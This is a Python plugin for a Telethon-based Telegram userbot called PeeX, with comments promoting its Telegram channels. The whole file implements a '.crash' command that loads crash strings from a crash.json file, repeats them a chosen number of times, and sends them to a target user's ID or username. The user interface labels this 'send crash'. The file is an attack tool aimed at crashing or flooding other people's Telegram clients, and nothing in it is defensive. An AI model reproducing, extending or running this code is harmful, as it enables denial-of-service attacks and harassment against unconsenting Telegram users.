# Coded By PeeX Authority 
# Please Join Telegram Channel For Updated
# PeeX - Userbot
# t.me/peexubot
# t.me/peex_ubot
import json
from telethon import events

def get_crash_text(typ):
    try:
        with open("crash.json", "r") as file:
            crash_data = json.load(file)
        return crash_data.get(typ, None)
    except FileNotFoundError:
        return None

async def crash_test(event, typ, jumlah, target):
    print(f"Running crash test with {typ} type for target: {target}")

    crash_text = get_crash_text(typ)
    if not crash_text:
        await event.reply("> **Tipe crash tidak dikenal atau tidak ada di crash.json!**")
        return

    message = crash_text * jumlah

    pending_msg = await event.reply(
        f"« « ᴘᴇɴᴅɪɴɢ sᴇɴᴅ ᴄʀᴀsʜ » »\n"
        f"| • ᴛʏᴘᴇ : {typ}\n"
        f"| • ᴊᴜᴍʟᴀʜ : {jumlah}\n"
        f"| • ɪᴅ : {target}\n"
    )

    await event.client.send_message(target, message)

    await pending_msg.edit(
        f"« « sᴜᴄᴄᴇsғᴜʟʟʏ sᴇɴᴅ ᴄʀᴀsʜ » »\n"
        f"| • ᴛʏᴘᴇ : {typ}\n"
        f"| • ᴊᴜᴍʟᴀʜ : {jumlah}\n"
        f"| • ɪᴅ : {target}\n"
    )

async def handle_crash(event):
    args = event.text.split("|")
    
    if len(args) < 2 or len(args) > 3:
        await event.reply("> **Format salah! Pakai: .crash <tipe>|<jumlah>|<username/id>**")
        return

    typ = args[0].split()[1].lower()
    try:
        jumlah = int(args[1])
    except ValueError:
        await event.reply("> **Jumlah harus angka!**")
        return

    if event.is_reply:
        target = await event.get_reply_message()
        target = target.sender_id  
    else:
        target = args[2] if len(args) == 3 else event.sender_id

    await crash_test(event, typ, jumlah, target)

def register(client):
    @client.on(events.NewMessage(pattern=r"^\.crash (normal|super|hard)\|\d+(\|(@\w+|\d+))?$"))
    async def crash(event):
        await handle_crash(event)
